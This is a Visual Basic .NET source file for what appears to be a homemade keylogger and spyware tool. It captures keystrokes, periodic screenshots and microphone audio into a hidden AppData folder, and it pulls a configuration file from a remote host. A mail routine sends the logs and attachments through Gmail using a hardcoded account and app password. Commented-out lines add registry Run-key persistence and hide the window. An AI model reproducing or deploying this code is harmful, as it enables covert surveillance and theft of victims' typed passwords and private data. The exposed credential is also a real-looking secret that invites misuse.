Imports System.IO
Imports System.Net
Imports System.Net.Mail
Imports System.Runtime.InteropServices

Public Class Form1

    Dim Filez As String = ""
    Dim isrecording As Boolean = False
    Private Declare Function record Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Public log As String

    Dim log_timer As Integer = 60000
    Dim current_time As Integer = 0
    Dim screenshots_per_session As Integer = 10
    Dim current_screenshot_count As Integer = 1
    Dim ss_interval = log_timer / screenshots_per_session * current_screenshot_count

    Dim roaming_folder_path As String = "/vbnetkl"
    Dim session_id
    Dim previous_session_id


    'Tool Configs
    Dim RecordingEnabled As Boolean
    Dim LogTimer As Integer
    Dim ScreenshotPerSerrsion As Integer

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If (GetAsyncKeyState(65)) Then
            log = log + "A"
        ElseIf (GetAsyncKeyState(66)) Then
            log = log + "B"
        ElseIf (GetAsyncKeyState(67)) Then
            log = log + "C"
        ElseIf (GetAsyncKeyState(68)) Then
            log = log + "D"
        ElseIf (GetAsyncKeyState(69)) Then
            log = log + "E"
        ElseIf (GetAsyncKeyState(70)) Then
            log = log + "F"
        ElseIf (GetAsyncKeyState(71)) Then
            log = log + "G"
        ElseIf (GetAsyncKeyState(72)) Then
            log = log + "H"
        ElseIf (GetAsyncKeyState(73)) Then
            log = log + "I"
        ElseIf (GetAsyncKeyState(74)) Then
            log = log + "J"
        ElseIf (GetAsyncKeyState(75)) Then
            log = log + "K"
        ElseIf (GetAsyncKeyState(76)) Then
            log = log + "L"
        ElseIf (GetAsyncKeyState(77)) Then
            log = log + "M"
        ElseIf (GetAsyncKeyState(78)) Then
            log = log + "N"
        ElseIf (GetAsyncKeyState(79)) Then
            log = log + "O"
        ElseIf (GetAsyncKeyState(80)) Then
            log = log + "P"
        ElseIf (GetAsyncKeyState(81)) Then
            log = log + "Q"
        ElseIf (GetAsyncKeyState(82)) Then
            log = log + "R"
        ElseIf (GetAsyncKeyState(83)) Then
            log = log + "S"
        ElseIf (GetAsyncKeyState(84)) Then
            log = log + "T"
        ElseIf (GetAsyncKeyState(85)) Then
            log = log + "U"
        ElseIf (GetAsyncKeyState(86)) Then
            log = log + "V"
        ElseIf (GetAsyncKeyState(87)) Then
            log = log + "W"
        ElseIf (GetAsyncKeyState(88)) Then
            log = log + "X"
        ElseIf (GetAsyncKeyState(89)) Then
            log = log + "Y"
        ElseIf (GetAsyncKeyState(90)) Then
            log = log + "Z"
        ElseIf (GetAsyncKeyState(48)) Then
            log = log + "0"
        ElseIf (GetAsyncKeyState(49)) Then
            log = log + "1"
        ElseIf (GetAsyncKeyState(50)) Then
            log = log + "2"
        ElseIf (GetAsyncKeyState(51)) Then
            log = log + "3"
        ElseIf (GetAsyncKeyState(52)) Then
            log = log + "4"
        ElseIf (GetAsyncKeyState(53)) Then
            log = log + "5"
        ElseIf (GetAsyncKeyState(54)) Then
            log = log + "6"
        ElseIf (GetAsyncKeyState(55)) Then
            log = log + "7"
        ElseIf (GetAsyncKeyState(56)) Then
            log = log + "8"
        ElseIf (GetAsyncKeyState(57)) Then
            log = log + "9"
        ElseIf (GetAsyncKeyState(96)) Then
            log = log + "{Num0}"
        ElseIf (GetAsyncKeyState(97)) Then
            log = log + "{Num1}"
        ElseIf (GetAsyncKeyState(98)) Then
            log = log + "{Num2}"
        ElseIf (GetAsyncKeyState(99)) Then
            log = log + "{Num3}"
        ElseIf (GetAsyncKeyState(100)) Then
            log = log + "{Num4}"
        ElseIf (GetAsyncKeyState(101)) Then
            log = log + "{Num5}"
        ElseIf (GetAsyncKeyState(102)) Then
            log = log + "{Num6}"
        ElseIf (GetAsyncKeyState(103)) Then
            log = log + "{Num7}"
        ElseIf (GetAsyncKeyState(104)) Then
            log = log + "{Num8}"
        ElseIf (GetAsyncKeyState(105)) Then
            log = log + "{Num9}"
        ElseIf (GetAsyncKeyState(106)) Then
            log = log + "{Num*}"
        ElseIf (GetAsyncKeyState(107)) Then
            log = log + "{Num+}"
        ElseIf (GetAsyncKeyState(13)) Then
            log = log + "{Enter}"
        ElseIf (GetAsyncKeyState(109)) Then
            log = log + "{Num-}"
        ElseIf (GetAsyncKeyState(110)) Then
            log = log + "{Num.}"
        ElseIf (GetAsyncKeyState(111)) Then
            log = log + "{Num/}"
        ElseIf (GetAsyncKeyState(32)) Then
            log = log + " "
        ElseIf (GetAsyncKeyState(8)) Then
            log = log + "{Backspace}"
        ElseIf (GetAsyncKeyState(9)) Then
            log = log + "{Tab}"
        ElseIf (GetAsyncKeyState(16)) Then
            log = log + "{Shift}"
        ElseIf (GetAsyncKeyState(17)) Then
            log = log + "{Control}"
        ElseIf (GetAsyncKeyState(20)) Then
            log = log + "{Caps}"
        ElseIf (GetAsyncKeyState(27)) Then
            log = log + "{Esc}"
        ElseIf (GetAsyncKeyState(33)) Then
            log = log + "{PGup}"
        ElseIf (GetAsyncKeyState(34)) Then
            log = log + "{PGdn}"
        ElseIf (GetAsyncKeyState(35)) Then
            log = log + "{End}"
        ElseIf (GetAsyncKeyState(36)) Then
            log = log + "{Home}"
        ElseIf (GetAsyncKeyState(37)) Then
            log = log + "{LArrow}"
        ElseIf (GetAsyncKeyState(38)) Then
            log = log + "{UArrow}"
        ElseIf (GetAsyncKeyState(39)) Then
            log = log + "{RArrow}"
        ElseIf (GetAsyncKeyState(40)) Then
            log = log + "{DArrow}"
        ElseIf (GetAsyncKeyState(45)) Then
            log = log + "{Insert}"
        ElseIf (GetAsyncKeyState(46)) Then
            log = log + "{Del}"
        ElseIf (GetAsyncKeyState(144)) Then
            log = log + "{NumLock}"
        ElseIf (GetAsyncKeyState(188)) Then
            log = log + "{,}"
        End If
        RichTextBox1.Text = log
        'Dim hotkey1 As Boolean
        'hotkey1 = GetAsyncKeyState(Keys.K)
        ' If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.ShiftKeyDown AndAlso hotkey1 Then
        'Me.Visible = True
        'Me.ShowInTaskbar = True
        'End If



        current_time = current_time + Timer1.Interval

        If current_time = ss_interval Then
            TakeScreenshot()
            current_screenshot_count += 1
            ss_interval = log_timer / screenshots_per_session * current_screenshot_count
        End If
        If current_time >= log_timer Then
            File.WriteAllText(GetAppDataPath() & roaming_folder_path & "/" & session_id & "/" & GenerateGUID() & ".txt", RichTextBox1.Text)
            'SendLog()
            current_time = 0
            current_screenshot_count = 1
            ss_interval = log_timer / screenshots_per_session * current_screenshot_count
            previous_session_id = session_id
            session_id = GenerateGUID()
            If Not System.IO.Directory.Exists(GetAppDataPath() & roaming_folder_path & "/" & session_id) Then
                System.IO.Directory.CreateDirectory(GetAppDataPath() & roaming_folder_path & "/" & session_id)
            End If
        End If
    End Sub

    Function GetAppDataPath() As String
        Return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    End Function

    Private Sub TakeScreenshot()
        Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim g As Graphics = Graphics.FromImage(screenGrab)
        g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize)
        'Return screenGrab
        screenGrab.Save(IO.Path.Combine(GetAppDataPath() & roaming_folder_path & "/" & session_id, GenerateGUID() & ".jpg"), Imaging.ImageFormat.Jpeg)
    End Sub

    Private Function GenerateGUID()
        Dim sGUID As String
        sGUID = System.Guid.NewGuid.ToString()
        Return sGUID
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        'My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
        LoadOnlineConfigs()
        Directory.Delete(GetAppDataPath() & roaming_folder_path, True)
        session_id = GenerateGUID()
        If Not System.IO.Directory.Exists(GetAppDataPath() & roaming_folder_path) Then
            System.IO.Directory.CreateDirectory(GetAppDataPath() & roaming_folder_path)
        End If
        StartLogging()

    End Sub

    Private Sub LoadOnlineConfigs()
        Dim address As String = "https://pubstatic.com/vbnetkl_configs.ini"
        Dim client As WebClient = New WebClient()
        Dim reader As StreamReader = New StreamReader(client.OpenRead(address))
        TextBox1.Text = reader.ReadToEnd
    End Sub

    Private Sub LoadConfigs()

        For Each s As String In Me.TextBox1.Lines
            Dim str2() As String = Split(s, "=")

        Next

    End Sub

    Private Sub SendEmail()
        Try
            Dim Smtp_Server As New SmtpClient
            Dim e_mail As New MailMessage()
            Smtp_Server.UseDefaultCredentials = False
            Smtp_Server.Credentials = New System.Net.NetworkCredential("mihai.gabriel1609@gmail.com", "hgvcslqoskbtnlkj")
            Smtp_Server.Port = 587
            Smtp_Server.EnableSsl = True
            Smtp_Server.Host = "smtp.gmail.com"

            e_mail = New MailMessage()
            e_mail.From = New MailAddress("mihai.gabriel1609@gmail.com")
            e_mail.To.Add("mihai.gabriel1608@gmail.com")
            e_mail.Subject = session_id
            e_mail.IsBodyHtml = False
            e_mail.Body = RichTextBox1.Text
            Dim files() As String = IO.Directory.GetFiles(GetAppDataPath() & roaming_folder_path & "/" & session_id)
            For Each file As String In files
                e_mail.Attachments.Add(New System.Net.Mail.Attachment(file))
            Next
            Smtp_Server.Send(e_mail)
            'MsgBox("Mail Sent")

        Catch error_t As Exception
            'MsgBox(error_t.ToString)
        End Try
    End Sub

    Private Sub StartLogging()

        Timer1.Start()
        StartRecording()
        If Not System.IO.Directory.Exists(GetAppDataPath() & roaming_folder_path & "/" & session_id) Then
            System.IO.Directory.CreateDirectory(GetAppDataPath() & roaming_folder_path & "/" & session_id)
        End If


    End Sub

    Private Sub SendLog()
        SendEmail()
        'If previous_session_id = "" Then
        'Directory.Delete(GetAppDataPath() & roaming_folder_path & "/" & previous_session_id, True)
        'End If
    End Sub

    Private Sub StartRecording()
        record("open new Type waveaudio Alias recsound", "", 0, 0)
        record("record recsound", "", 0, 0)
    End Sub

    Private Sub StopRecording()
        record("save recsound " & GetAppDataPath() & roaming_folder_path & "/" & session_id & "", "", 0, 0)
        record("close recsound", "", 0, 0)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        My.Computer.Audio.Play(GetAppDataPath() & roaming_folder_path & "/" & session_id, AudioPlayMode.Background)
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        TakeScreenshot()
    End Sub

    Private Sub UpdateVars()
        Label6.Text = log_timer
        Label7.Text = current_time
        Label8.Text = screenshots_per_session
        Label9.Text = current_screenshot_count
        Label10.Text = ss_interval
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        UpdateVars()
    End Sub

    Private Sub Form1_Shown(sender As Object, e As EventArgs) Handles MyBase.Shown
        'Me.Visible = False
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        Dim objIniFile As New clsIni("vbnetkl_configs.ini")
        Dim x As Integer
        x = objIniFile.GetInteger("CONFIGS", "EnabledRecording", 0)
        MsgBox(x.ToString())
    End Sub
End Class
